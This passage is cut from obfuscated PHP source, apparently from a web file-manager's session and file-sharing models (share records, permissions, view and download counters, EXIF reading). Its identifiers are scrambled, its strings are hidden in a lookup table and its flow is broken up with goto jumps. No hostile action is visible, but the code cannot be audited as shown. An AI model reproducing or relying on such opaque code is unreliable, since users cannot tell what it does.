[1661])->pluginCacheFileSet($eˆ” íÄˆº, $aÑÄî¢µ·è); unset($c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1645]]); } $dÊî×«Ğ£ = _get($c³„¹Ù“Ü, $DÁ¾”ñÂ [1663], $DÁ¾”ñÂ [33]); $E¿˜¯ò«ŸÄ = _get($c³„¹Ù“Ü, $DÁ¾”ñÂ [1664], $DÁ¾”ñÂ [33]); goto E‹†İÌÌ»; E‹†İÌÌ»: $b…à†­•çº = _get($c³„¹Ù“Ü, $DÁ¾”ñÂ [1665], $DÁ¾”ñÂ [33]); $C¿„¼…˜» = $dÊî×«Ğ£ . $E¿˜¯ò«ŸÄ . $b…à†­•çº; if ($C¿„¼…˜» && get_charset($C¿„¼…˜») != $DÁ¾”ñÂ [341]) { $c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1368]] = iconv_to($c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1368]], get_charset($C¿„¼…˜»), $DÁ¾”ñÂ [341]); $c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1666]] = iconv_to($c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1666]], get_charset($C¿„¼…˜»), $DÁ¾”ñÂ [341]); $c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1667]] = iconv_to($c³„¹Ù“Ü[$DÁ¾”ñÂ [1662]][$DÁ¾”ñÂ [1667]], get_charset($C¿„¼…˜»), $DÁ¾”ñÂ [341]); } goto Bš„İ¼‰Š±; Bš„İ¼‰Š±: return $c³„¹Ù“Ü; goto E¹çà±˜ˆÍ; E¹çà±˜ˆÍ: } private static function valueReset($F®†¤œ”¦, $f†Ìæ³Û¯, $DĞÚ†Ğ”¦ë) { $Bº÷±­£×‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aä–‡øŸé“ = $Bº÷±­£×‘[1584]; switch ($F®†¤œ”¦) { case $Bº÷±­£×‘[1668]: $f†Ìæ³Û¯ = $f†Ìæ³Û¯ == $Bº÷±­£×‘[83] ? $Bº÷±­£×‘[1669] : $Bº÷±­£×‘[1670]; break; case $Bº÷±­£×‘[1671]: $f†Ìæ³Û¯ = $f†Ìæ³Û¯ ? $f†Ìæ³Û¯ : null; break; default: break; } switch ($DĞÚ†Ğ”¦ë) { case $Bº÷±­£×‘[1672]: $f†Ìæ³Û¯ = round($f†Ìæ³Û¯, 2); break; case $Bº÷±­£×‘[200]: case $Bº÷±­£×‘[107]: if ($f†Ìæ³Û¯ < 0) { $f†Ìæ³Û¯ = null; } else { if (is_numeric($f†Ìæ³Û¯)) { $f†Ìæ³Û¯ = date($Aä–‡øŸé“, $f†Ìæ³Û¯); } } break; default: break; } return $f†Ìæ³Û¯; } private static function fileTypeArray() { $c‘ÓÓ¡¹Îí =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($c‘ÓÓ¡¹Îí[1645] => array($c‘ÓÓ¡¹Îí[165] => $c‘ÓÓ¡¹Îí[1673] . $c‘ÓÓ¡¹Îí[1674], $c‘ÓÓ¡¹Îí[1649] => array($c‘ÓÓ¡¹Îí[162] => $c‘ÓÓ¡¹Îí[1675], $c‘ÓÓ¡¹Îí[163] => $c‘ÓÓ¡¹Îí[1676], $c‘ÓÓ¡¹Îí[1677] => $c‘ÓÓ¡¹Îí[1678], $c‘ÓÓ¡¹Îí[1679] => $c‘ÓÓ¡¹Îí[1680], $c‘ÓÓ¡¹Îí[200] => $c‘ÓÓ¡¹Îí[1681], $c‘ÓÓ¡¹Îí[107] => $c‘ÓÓ¡¹Îí[1682], $c‘ÓÓ¡¹Îí[1683] => $c‘ÓÓ¡¹Îí[1684], $c‘ÓÓ¡¹Îí[1685] => $c‘ÓÓ¡¹Îí[1686], $c‘ÓÓ¡¹Îí[1687] => $c‘ÓÓ¡¹Îí[1688], $c‘ÓÓ¡¹Îí[1689] => $c‘ÓÓ¡¹Îí[1690], $c‘ÓÓ¡¹Îí[1691] => $c‘ÓÓ¡¹Îí[1692], $c‘ÓÓ¡¹Îí[1693] => $c‘ÓÓ¡¹Îí[1694], $c‘ÓÓ¡¹Îí[1695] => $c‘ÓÓ¡¹Îí[1696], $c‘ÓÓ¡¹Îí[1697] => array($c‘ÓÓ¡¹Îí[1698] => $c‘ÓÓ¡¹Îí[1699], $c‘ÓÓ¡¹Îí[1700] => $c‘ÓÓ¡¹Îí[1701], $c‘ÓÓ¡¹Îí[1702] => $c‘ÓÓ¡¹Îí[1703]), $c‘ÓÓ¡¹Îí[1704] => $c‘ÓÓ¡¹Îí[1705], $c‘ÓÓ¡¹Îí[1706] => $c‘ÓÓ¡¹Îí[1707], $c‘ÓÓ¡¹Îí[1708] => $c‘ÓÓ¡¹Îí[1709], $c‘ÓÓ¡¹Îí[1710] => $c‘ÓÓ¡¹Îí[1711], $c‘ÓÓ¡¹Îí[1712] => array($c‘ÓÓ¡¹Îí[1713] => $c‘ÓÓ¡¹Îí[1714], $c‘ÓÓ¡¹Îí[1715] => $c‘ÓÓ¡¹Îí[1716], $c‘ÓÓ¡¹Îí[1717] => $c‘ÓÓ¡¹Îí[1718], $c‘ÓÓ¡¹Îí[1719] => $c‘ÓÓ¡¹Îí[1720], $c‘ÓÓ¡¹Îí[1721] => $c‘ÓÓ¡¹Îí[1722], $c‘ÓÓ¡¹Îí[1723] => $c‘ÓÓ¡¹Îí[1724], $c‘ÓÓ¡¹Îí[1725] => $c‘ÓÓ¡¹Îí[1726], $c‘ÓÓ¡¹Îí[1727] => $c‘ÓÓ¡¹Îí[1728], $c‘ÓÓ¡¹Îí[1729] => $c‘ÓÓ¡¹Îí[1730], $c‘ÓÓ¡¹Îí[1731] => $c‘ÓÓ¡¹Îí[1732], $c‘ÓÓ¡¹Îí[1733] => $c‘ÓÓ¡¹Îí[1734]))), $c‘ÓÓ¡¹Îí[1735] => array($c‘ÓÓ¡¹Îí[165] => $c‘ÓÓ¡¹Îí[1736] . $c‘ÓÓ¡¹Îí[1737], $c‘ÓÓ¡¹Îí[1649] => array($c‘ÓÓ¡¹Îí[1653] => $c‘ÓÓ¡¹Îí[1738], $c‘ÓÓ¡¹Îí[200] => $c‘ÓÓ¡¹Îí[1739], $c‘ÓÓ¡¹Îí[107] => $c‘ÓÓ¡¹Îí[1740], $c‘ÓÓ¡¹Îí[1685] => $c‘ÓÓ¡¹Îí[1741], $c‘ÓÓ¡¹Îí[1742] => $c‘ÓÓ¡¹Îí[1743], $c‘ÓÓ¡¹Îí[1744] => $c‘ÓÓ¡¹Îí[1671], $c‘ÓÓ¡¹Îí[1745] => $c‘ÓÓ¡¹Îí[1746], $c‘ÓÓ¡¹Îí[1747] => $c‘ÓÓ¡¹Îí[1748], $c‘ÓÓ¡¹Îí[1749] => $c‘ÓÓ¡¹Îí[1750], $c‘ÓÓ¡¹Îí[1662] => array($c‘ÓÓ¡¹Îí[1368] => $c‘ÓÓ¡¹Îí[1751], $c‘ÓÓ¡¹Îí[1666] => $c‘ÓÓ¡¹Îí[1752], $c‘ÓÓ¡¹Îí[1667] => $c‘ÓÓ¡¹Îí[1753], $c‘ÓÓ¡¹Îí[1754] => $c‘ÓÓ¡¹Îí[1755], $c‘ÓÓ¡¹Îí[1756] => $c‘ÓÓ¡¹Îí[1757], $c‘ÓÓ¡¹Îí[1758] => $c‘ÓÓ¡¹Îí[1759], $c‘ÓÓ¡¹Îí[1645] => $c‘ÓÓ¡¹Îí[1760]))), $c‘ÓÓ¡¹Îí[1761] => array($c‘ÓÓ¡¹Îí[165] => $c‘ÓÓ¡¹Îí[1762] . $c‘ÓÓ¡¹Îí[1763], $c‘ÓÓ¡¹Îí[1649] => array($c‘ÓÓ¡¹Îí[162] => $c‘ÓÓ¡¹Îí[1764], $c‘ÓÓ¡¹Îí[163] => $c‘ÓÓ¡¹Îí[1765], $c‘ÓÓ¡¹Îí[1653] => $c‘ÓÓ¡¹Îí[1738], $c‘ÓÓ¡¹Îí[200] => $c‘ÓÓ¡¹Îí[1766], $c‘ÓÓ¡¹Îí[107] => $c‘ÓÓ¡¹Îí[1767], $c‘ÓÓ¡¹Îí[1672] => $c‘ÓÓ¡¹Îí[1768], $c‘ÓÓ¡¹Îí[1749] => $c‘ÓÓ¡¹Îí[1769], $c‘ÓÓ¡¹Îí[1745] => $c‘ÓÓ¡¹Îí[1770], $c‘ÓÓ¡¹Îí[1685] => $c‘ÓÓ¡¹Îí[1771], $c‘ÓÓ¡¹Îí[1735] => array($c‘ÓÓ¡¹Îí[1744] => $c‘ÓÓ¡¹Îí[1671], $c‘ÓÓ¡¹Îí[1772] => $c‘ÓÓ¡¹Îí[1773], $c‘ÓÓ¡¹Îí[1742] => $c‘ÓÓ¡¹Îí[1743], $c‘ÓÓ¡¹Îí[1749] => $c‘ÓÓ¡¹Îí[1750], $c‘ÓÓ¡¹Îí[1745] => $c‘ÓÓ¡¹Îí[1774], $c‘ÓÓ¡¹Îí[1747] => $c‘ÓÓ¡¹Îí[1748]))), $c‘ÓÓ¡¹Îí[1775] => array($c‘ÓÓ¡¹Îí[1649] => array($c‘ÓÓ¡¹Îí[1776] => $c‘ÓÓ¡¹Îí[1777], $c‘ÓÓ¡¹Îí[1778] => $c‘ÓÓ¡¹Îí[1779])), $c‘ÓÓ¡¹Îí[1780] => array($c‘ÓÓ¡¹Îí[1649] => array())); } } function exif_read_data_io($BÉË§»Ìë, $D°øöœœ¹ø = null, $CÙã¯ÏÙ—ã = false, $A´æ£œÈ† = false) { $E’¦“¾¿¶ = StreamWrapperIO::read($BÉË§»Ìë, 0, 1024 * 64); $c‹Ñ…ëåòÏ = $_SERVER[åÌÛ»ô¢‚ö™][1781] . base64_encode($E’¦“¾¿¶); return exif_read_data($c‹Ñ…ëåòÏ, $D°øöœœ¹ø, $CÙã¯ÏÙ—ã, $A´æ£œÈ†); } goto B‰¦‹š…’¿; DÇËí—µ®: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\x5f\x73\145\163\163\151\157\156"; public function get($aáİáéºÌĞ) { $BÁÀ¦„Üíğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f×Äé®À“ = $this->where(array($BÁÀ¦„Üíğ[2256] => $aáİáéºÌĞ))->find(); if (!is_array($f×Äé®À“)) { return !1; } return $f×Äé®À“[$BÁÀ¦„Üíğ[719]]; } public function set($aã‹ÆèŠè, $Fõ¶á£†‚Ø, $D¨²¹¿•¸´ = 3600) { $aŞõ¬»Ü™Û =& $_SERVER[åÌÛ»ô¢‚ö™]; $BŒ¬ÄøØºó = array($aŞõ¬»Ü™Û[2256] => $aã‹ÆèŠè, $aŞõ¬»Ü™Û[2169] => $Fõ¶á£†‚Ø, $aŞõ¬»Ü™Û[2257] => $D¨²¹¿•¸´ + time()); if (Session::get($aŞõ¬»Ü™Û[2258])) { $BŒ¬ÄøØºó[$aŞõ¬»Ü™Û[1465]] = Session::get($aŞõ¬»Ü™Û[2258]); } else { $BŒ¬ÄøØºó[$aŞõ¬»Ü™Û[1465]] = 0; } if ($this->get($aã‹ÆèŠè)) { return $this->where(array($aŞõ¬»Ü™Û[2256] => $aã‹ÆèŠè))->save($BŒ¬ÄøØºó); } else { return $this->add($BŒ¬ÄøØºó, array(), !0); } } public function remove($Aà÷¼·Œá) { return $this->where(array($_SERVER[åÌÛ»ô¢‚ö™][2256] => $Aà÷¼·Œá))->delete(); } public function clearTimeout() { return $this->where($_SERVER[åÌÛ»ô¢‚ö™][2259] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\x6e\x73\145\x72\x74\54\165\x70\144\x61\164\x65", "\146\x75\156\143\x74\151\157\156"), array("\143\162\x65\x61\x74\x65\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\x72\x74", "\x66\165\156\143\164\x69\157\x6e"), array("\x6f\x70\x74\x69\157\156\163", '', "\x69\x6e\163\x65\x72\164\x2c\165\x70\144\141\164\145\x2c\163\x65\x6c\x65\143\x74", "\152\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($eŸ¸ŸÊ¹Ô) { $Fº¢¸£é´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¿§Šà…ç = isset($eŸ¸ŸÊ¹Ô[0]) ? $eŸ¸ŸÊ¹Ô[0] : !1; return array($Fº¢¸£é´[2260] => array(USER_ID, $Fº¢¸£é´[2261]), $Fº¢¸£é´[2209] => array($b¿§Šà…ç, $Fº¢¸£é´[2262])); } protected function listSimple() { $a»’Å®ä = array($_SERVER[åÌÛ»ô¢‚ö™][1465] => USER_ID); $bùÜ¿¯ßÀ¦ = $this->field($this->fieldList)->where($a»’Å®ä)->select(); return $bùÜ¿¯ßÀ¦ ? $bùÜ¿¯ßÀ¦ : array(); } protected function getInfo($dÎ™ëæ¡È, $F”°º‘ƒê = false) { $eĞ¬—Œö·¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($F”°º‘ƒê) { return $this->_getShareInfo(array($eĞ¬—Œö·¿[465] => $dÎ™ëæ¡È)); } $Eò›–Æù = $this->cacheFunctionGet($eĞ¬—Œö·¿[2263], $dÎ™ëæ¡È); return $Eò›–Æù; } public function getInfoByHash($EàßŠ®•¶‚) { return $this->_getShareInfo(array($_SERVER[åÌÛ»ô¢‚ö™][467] => $EàßŠ®•¶‚)); } public function getInfoByPath($DÜĞ¡¨È‘Å) { $e…„œ¤ôËë =& $_SERVER[åÌÛ»ô¢‚ö™]; $E‚ô¶¥ãô¬ = array($e…„œ¤ôËë[1465] => USER_ID, $e…„œ¤ôËë[394] => $DÜĞ¡¨È‘Å); return $this->_getShareInfo($E‚ô¶¥ãô¬); } public function getInfoBySourcePath($dÉÀ… í¸ì) { $e‹ÉÍƒ˜• =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÙà±ÚîÃŞ = array($e‹ÉÍƒ˜•[1465] => USER_ID, $e‹ÉÍƒ˜•[1046] => $dÉÀ… í¸ì); return $this->_getShareInfo($cÙà±ÚîÃŞ); } private function _getShareInfo($cºñÏõï) { goto eÚÔÄƒÇ¿—; E¤ÕÌ—º‚í: if ($B°ğ½´•‰¨[$b‘—”‡•²Â[394]] == $b‘—”‡•²Â[494]) { $B°ğ½´•‰¨[$b‘—”‡•²Â[416]] = IO::info($B°ğ½´•‰¨[$b‘—”‡•²Â[1046]]); } else { $B°ğ½´•‰¨[$b‘—”‡•²Â[416]] = Model($b‘—”‡•²Â[1143])->pathInfo($B°ğ½´•‰¨[$b‘—”‡•²Â[394]]); } $B°ğ½´•‰¨[$b‘—”‡•²Â[2265]] = $AØëãÒ¼¬; return $B°ğ½´•‰¨; goto cÍ¾¸ßˆ•é; eÚÔÄƒÇ¿—: $b‘—”‡•²Â =& $_SERVER[åÌÛ»ô¢‚ö™]; $B°ğ½´•‰¨ = $this->where($cºñÏõï)->find(); if (!$B°ğ½´•‰¨) { return !1; } goto Bë¾‘½¥¬¦; Bë¾‘½¥¬¦: $cºñÏõï = array($b‘—”‡•²Â[465] => $B°ğ½´•‰¨[$b‘—”‡•²Â[465]]); $Fùº¸‘Ëİğ = $b‘—”‡•²Â[2264]; $AØëãÒ¼¬ = Model($b‘—”‡•²Â[562])->order($b‘—”‡•²Â[392])->field($Fùº¸‘Ëİğ)->where($cºñÏõï)->select(); goto E¤ÕÌ—º‚í; cÍ¾¸ßˆ•é: } protected function getInfoAuth($D¸«ÁéóÏ) { $a“ˆĞÑ¾À =& $_SERVER[åÌÛ»ô¢‚ö™]; $B—Šïñ’öã = $this->getInfo($D¸«ÁéóÏ); $B—Šïñ’öã[$a“ˆĞÑ¾À[401]] = Model($a“ˆĞÑ¾À[480])->authMake($B—Šïñ’öã[$a“ˆĞÑ¾À[2265]]); return $B—Šïñ’öã; } protected function listData($b©âóáª«ª = null, $cùôÄ„á = 300) { $aÒòÄ•Ù™ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¢¯ƒôù¯• = array(array($aÒòÄ•Ù™[470] => array($aÒòÄ•Ù™[947], 0), $aÒòÄ•Ù™[472] => array($aÒòÄ•Ù™[947], 0), $aÒòÄ•Ù™[2266] => $aÒòÄ•Ù™[2223])); if ($b©âóáª«ª == $aÒòÄ•Ù™[1904]) { $D¢¯ƒôù¯• = array($aÒòÄ•Ù™[470] => 1); } else { if ($b©âóáª«ª == $aÒòÄ•Ù™[1031]) { $D¢¯ƒôù¯• = array($aÒòÄ•Ù™[472] => 1); } } $D¢¯ƒôù¯•[$aÒòÄ•Ù™[1465]] = USER_ID; $aÙƒåáïè¬ = $this->where($D¢¯ƒôù¯•)->selectPage($cùôÄ„á); return $aÙƒåáïè¬; } protected function listToMe($fá÷à®õ‘ = 300) { goto fÚ¨ØôÌ°•; f‹ùÃã³ç°: if ($eØƒ¿Úõî) { $e¬­ß•éæ = array(array($AÇˆãÀÍÁğ[547] => SourceModel::TYPE_USER, $AÇˆãÀÍÁğ[482] => USER_ID), array($AÇˆãÀÍÁğ[547] => SourceModel::TYPE_GROUP, $AÇˆãÀÍÁğ[482] => array($AÇˆãÀÍÁğ[7], $eØƒ¿Úõî)), $AÇˆãÀÍÁğ[2266] => $AÇˆãÀÍÁğ[2223]); } $FçòÇ“¨ÍÕ = Model($AÇˆãÀÍÁğ[562])->where($e¬­ß•éæ)->selectPage($fá÷à®õ‘); $E„çÍ†ô­Š = array_to_keyvalue_group($FçòÇ“¨ÍÕ[$AÇˆãÀÍÁğ[370]], $AÇˆãÀÍÁğ[465]); goto C“É÷˜áÜ‚; D­›´®‹¹í: $DÌÈ“Æ‰…² = $this->field($Aöµˆ“ÈÈÈ)->where($e¬­ß•éæ)->select(); foreach ($DÌÈ“Æ‰…² as $açé†çœ¶¾ => &$AÃíÇïÊÃ) { $AÃíÇïÊÃ[$AÇˆãÀÍÁğ[2265]] = $E„çÍ†ô­Š[$AÃíÇïÊÃ[$AÇˆãÀÍÁğ[465]]]; } unset($AÃíÇïÊÃ); goto A´‰‚ˆíºÅ; A´‰‚ˆíºÅ: $b¦ƒ®Íê‚— = array($AÇˆãÀÍÁğ[2269] => $DÌÈ“Æ‰…², $AÇˆãÀÍÁğ[2270] => $FçòÇ“¨ÍÕ[$AÇˆãÀÍÁğ[367]]); return $b¦ƒ®Íê‚—; goto a®áÀ¢ßÑÜ; fÚ¨ØôÌ°•: $AÇˆãÀÍÁğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eØƒ¿Úõî = Model($AÇˆãÀÍÁğ[2267])->userGroupParents(USER_ID); $e¬­ß•éæ = array($AÇˆãÀÍÁğ[547] => SourceModel::TYPE_USER, $AÇˆãÀÍÁğ[482] => USER_ID); goto f‹ùÃã³ç°; C“É÷˜áÜ‚: if (!$E„çÍ†ô­Š) { return $FçòÇ“¨ÍÕ; } $Aöµˆ“ÈÈÈ = $AÇˆãÀÍÁğ[2268]; $e¬­ß•éæ = array($AÇˆãÀÍÁğ[465] => array($AÇˆãÀÍÁğ[409], array_keys($E„çÍ†ô­Š))); goto D­›´®‹¹í; a®áÀ¢ßÑÜ: } protected function shareAdd($d‘Óå¯Áù, $Aİ‰ÍæÈŠÈ) { $FŞãÁ¸§íÓ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EâåÍíêÏ = $this->_addShareData($d‘Óå¯Áù, $Aİ‰ÍæÈŠÈ); if (!empty($Aİ‰ÍæÈŠÈ[$FŞãÁ¸§íÓ[2271]])) { $this->_shareAuthSet($EâåÍíêÏ, $Aİ‰ÍæÈŠÈ[$FŞãÁ¸§íÓ[2271]]); } $this->shareEventAdd($d‘Óå¯Áù, $Aİ‰ÍæÈŠÈ, $FŞãÁ¸§íÓ[1034]); return $EâåÍíêÏ; } private function shareEventAdd($d¹å¹¢¿í¬, $fÆÉå­™çÉ, $eÏÌ·³´­Ÿ = "\x61\x64\144") { goto CŠ»šºøà¼; D±Îù‰ê£: $E›ŞîÚÀ¢ = $c’–ÉæÂàù[2274]; if ($e¸ìŠìæì[$c’–ÉæÂàù[470]] == $c’–ÉæÂàù[494] && $fÆÉå­™çÉ[$c’–ÉæÂàù[470]] == $c’–ÉæÂàù[83]) { $E›ŞîÚÀ¢ = $c’–ÉæÂàù[2272]; } if ($e¸ìŠìæì[$c’–ÉæÂàù[470]] == $c’–ÉæÂàù[83] && $fÆÉå­™çÉ[$c’–ÉæÂàù[470]] == $c’–ÉæÂàù[494]) { $E›ŞîÚÀ¢ = $c’–ÉæÂàù[2275]; } goto a‡˜“‡Ë²Á; CŠ»šºøà¼: $c’–ÉæÂàù =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($eÏÌ·³´­Ÿ == $c’–ÉæÂàù[1034]) { if ($fÆÉå­™çÉ[$c’–ÉæÂàù[470]] == $c’–ÉæÂàù[83]) { Model($c’–ÉæÂàù[531])->eventShare($d¹å¹¢¿í¬, $c’–ÉæÂàù[2272]); } if ($fÆÉå­™çÉ[$c’–ÉæÂàù[472]] == $c’–ÉæÂàù[83]) { Model($c’–ÉæÂàù[531])->eventShare($d¹å¹¢¿í¬, $c’–ÉæÂàù[2273]); } return; } $e¸ìŠìæì = $this->getInfoByPath($d¹å¹¢¿í¬); goto D±Îù‰ê£; a‡˜“‡Ë²Á: if ($e¸ìŠìæì[$c’–ÉæÂàù[472]] == $c’–ÉæÂàù[494] && $fÆÉå­™çÉ[$c’–ÉæÂàù[472]] == $c’–ÉæÂàù[83]) { $E›ŞîÚÀ¢ = $c’–ÉæÂàù[2273]; } if ($e¸ìŠìæì[$c’–ÉæÂàù[472]] == $c’–ÉæÂàù[83] && $fÆÉå­™çÉ[$c’–ÉæÂàù[472]] == $c’–ÉæÂàù[494]) { $E›ŞîÚÀ¢ = $c’–ÉæÂàù[2276]; } Model($c’–ÉæÂàù[531])->eventShare($d¹å¹¢¿í¬, $E›ŞîÚÀ¢); goto dè±‹ò‰›; dè±‹ò‰›: return; goto Dõ°¼êİ°•; Dõ°¼êİ°•: } private function _addShareData($fˆÃÇôöŸï, $CŸÅìŒ£¼À = array()) { goto D¡Ö¨Ûóœ; BµÁâÇìËÔ: $AãÑ‹ŠÀó = $this->add($A§¨¨İ½ç); $C‰¬ òÍêÍ = array($eìÑ„Öéçæ[467] => short_id($AãÑ‹ŠÀó)); $this->where(array($eìÑ„Öéçæ[464] => $AãÑ‹ŠÀó))->save($C‰¬ òÍêÍ); goto Bâõ¨Í¤Úã; Bâõ¨Í¤Úã: return $AãÑ‹ŠÀó; goto bÂÒ²µĞ‚‡; B‹ŒÌÀÜÈÀ: $A§¨¨İ½ç = array($eìÑ„Öéçæ[1457] => USER_ID, $eìÑ„Öéçæ[408] => $fˆÃÇôöŸï, $eìÑ„Öéçæ[1368] => $eìÑ„Öéçæ[33], $eìÑ„Öéçæ[470] => 0, $eìÑ„Öéçæ[472] => 0, $eìÑ„Öéçæ[1046] => $eìÑ„Öéçæ[33], $eìÑ„Öéçæ[310] => $eìÑ„Öéçæ[33], $eìÑ„Öéçæ[827] => $eìÑ„Öéçæ[33], $eìÑ„Öéçæ[2278] => 0, $eìÑ„Öéçæ[2279] => 0, $eìÑ„Öéçæ[473] => 0, $eìÑ„Öéçæ[474] => $eìÑ„Öéçæ[33], $eìÑ„Öéçæ[467] => $eìÑ„Öéçæ[33]); $BŠ’àÈÆ­° = explode($eìÑ„Öéçæ[47], $eìÑ„Öéçæ[2280]); foreach ($BŠ’àÈÆ­° as $fß¨“óÑ¦) { if (!isset($CŸÅìŒ£¼À[$fß¨“óÑ¦])) { continue; } $A§¨¨İ½ç[$fß¨“óÑ¦] = $CŸÅìŒ£¼À[$fß¨“óÑ¦]; } goto BµÁâÇìËÔ; b®Í…‰©¦Œ: if ($e«³‚Ğ÷ö = $this->where($a¡Ù¬à¹¬Ë)->find()) { return $e«³‚Ğ÷ö[$eìÑ„Öéçæ[465]]; } if ($fˆÃÇôöŸï == 0) { $eèÓ°Ğà¦Ï = array($eìÑ„Öéçæ[28] => get_path_this($CŸÅìŒ£¼À[$eìÑ„Öéçæ[75]])); } else { $eèÓ°Ğà¦Ï = Model($eìÑ„Öéçæ[778])->sourceInfo($fˆÃÇôöŸï); if (!$eèÓ°Ğà¦Ï) { return !1; } } if (!$CŸÅìŒ£¼À[$eìÑ„Öéçæ[1368]]) { $CŸÅìŒ£¼À[$eìÑ„Öéçæ[1368]] = $eèÓ°Ğà¦Ï[$eìÑ„Öéçæ[28]]; } goto B‹ŒÌÀÜÈÀ; D¡Ö¨Ûóœ: $eìÑ„Öéçæ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a¡Ù¬à¹¬Ë = array($eìÑ„Öéçæ[408] => $fˆÃÇôöŸï, $eìÑ„Öéçæ[1457] => USER_ID); if ($fˆÃÇôöŸï == 0) { $a¡Ù¬à¹¬Ë = array($eìÑ„Öéçæ[2277] => $CŸÅìŒ£¼À[$eìÑ„Öéçæ[1046]], $eìÑ„Öéçæ[1457] => USER_ID); } goto b®Í…‰©¦Œ; bÂÒ²µĞ‚‡: } private function _shareAuthSet($aö’¥‹çíğ, $Bôê–‡ìŸˆ) { goto e‡Õ•’òÆ; cÂµî›´«: return $fËÇŸ¹„¢->addAll($DÁŠæ›¥Õ‚, array(), !0); goto C¸ƒß†Ï…; e‡Õ•’òÆ: $eø†²¥‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!is_array($Bôê–‡ìŸˆ)) { return !1; } $fËÇŸ¹„¢ = Model($eø†²¥‰[2281]); goto fÄˆèâØó; fÄˆèâØó: $fËÇŸ¹„¢->where(array($eø†²¥‰[465] => $aö’¥‹çíğ))->delete(); $DÁŠæ›¥Õ‚ = array(); foreach ($Bôê–‡ìŸˆ as $aä»°–±®Ô) { $A×‡î´™‰¡ = SourceModel::TYPE_USER; if ($aä»°–±®Ô[$eø†²¥‰[396]] == SourceModel::TYPE_GROUP) { $A×‡î´™‰¡ = SourceModel::TYPE_GROUP; } $B õ¯«§‘¾ = array($eø†²¥‰[465] => $aö’¥‹çíğ, $eø†²¥‰[396] => $A×‡î´™‰¡, $eø†²¥‰[482] => intval($aä»°–±®Ô[$eø†²¥‰[482]]), $eø†²¥‰[2282] => 0, $eø†²¥‰[2283] => -1); if ($aä»°–±®Ô[$eø†²¥‰[2282]]) { $B õ¯«§‘¾[$eø†²¥‰[2282]] = $aä»°–±®Ô[$eø†²¥‰[2282]]; } else { if ($aä»°–±®Ô[$eø†²¥‰[2283]]) { $B õ¯«§‘¾[$eø†²¥‰[2283]] = $aä»°–±®Ô[$eø†²¥‰[2283]]; } } $DÁŠæ›¥Õ‚[] = $B õ¯«§‘¾; } goto cÂµî›´«; C¸ƒß†Ï…: } public function numViewAdd($dÑÇÃ‹ï½) { $bÄÎ¥Üí‹Ò =& $_SERVER[åÌÛ»ô¢‚ö™]; $C‘¿É­³¥ = array($bÄÎ¥Üí‹Ò[464] => $dÑÇÃ‹ï½); $this->where($C‘¿É­³¥)->setAdd($bÄÎ¥Üí‹Ò[2278]); } public function numDownloadAdd($c¸èã‡ƒ–) { $d‡¬ğ·æçî =& $_SERVER[åÌÛ»ô¢‚ö™]; $fé˜ã´µÙÂ = array($d‡¬ğ·æçî[464] => $c¸èã‡ƒ–); $this->where($fé˜ã´µÙÂ)->setAdd($d‡¬ğ·æçî[2279]); } protected function shareEdit($A…ƒ¹µÓâ, $fÒˆâì–›Ê) { goto Eîµ­¢µÜÀ; fÜ›Ø‹ï£ñ: foreach ($aš´·ã¸·° as $CÍÃƒ÷¥ŠŠ) { if (!array_key_exists($CÍÃƒ÷¥ŠŠ, $fÒˆâì–›Ê)) { continue; } $eß‰¥çÄ½[$CÍÃƒ÷¥ŠŠ] = $fÒˆâì–›Ê[$CÍÃƒ÷¥ŠŠ]; } $this->shareEventAdd($dÉƒ¸Š¹¯[$A“Õí¹‹³[394]], $fÒˆâì–›Ê, $A“Õí¹‹³[2105]); $this->where(array($A“Õí¹‹³[464] => $A…ƒ¹µÓâ))->save($eß‰¥çÄ½); goto F‹ªˆÙ¯ë“; fŞ‰ìàæ°: $this->_checkLinkShare($fÒˆâì–›Ê, $dÉƒ¸Š¹¯); $eß‰¥çÄ½ = array(); $aš´·ã¸·° = explode($A“Õí¹‹³[47], $A“Õí¹‹³[2284]); goto fÜ›Ø‹ï£ñ; Eîµ­¢µÜÀ: $A“Õí¹‹³ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÉƒ¸Š¹¯ = $this->getInfo($A…ƒ¹µÓâ); if (!$dÉƒ¸Š¹¯) { return !1; } goto fŞ‰ìàæ°; F‹ªˆÙ¯ë“: if (isset($fÒˆâì–›Ê[$A“Õí¹‹³[2271]])) { $this->_shareAuthSet($A…ƒ¹µÓâ, $fÒˆâì–›Ê[$A“Õí¹‹³[2271]]); } return !0; goto eçóë‚ŒÆÆ; eçóë‚ŒÆÆ: } private function _checkLinkShare($CÖ‹—Ä½ñ, $C˜±–¯Èï) { goto fá‹¤Éõ‹±; a¼Ò—ä‘§ñ: $eøö–ÊĞÖ = $this->shareFileMeta($f‰Å•ÅÛ¶¡[$a‚ùëó¶‹À[444]]); if (isset($eøö–ÊĞÖ[$a‚ùëó¶‹À[375]]) && $eøö–ÊĞÖ[$a‚ùëó¶‹À[375]] == $a‚ùëó¶‹À[83]) { show_json(LNG($a‚ùëó¶‹À[2287]), !1); } goto B¥ÃĞ‡Ì®; fá‹¤Éõ‹±: $a‚ùëó¶‹À =& $_SERVER[åÌÛ»ô¢‚ö™]; if 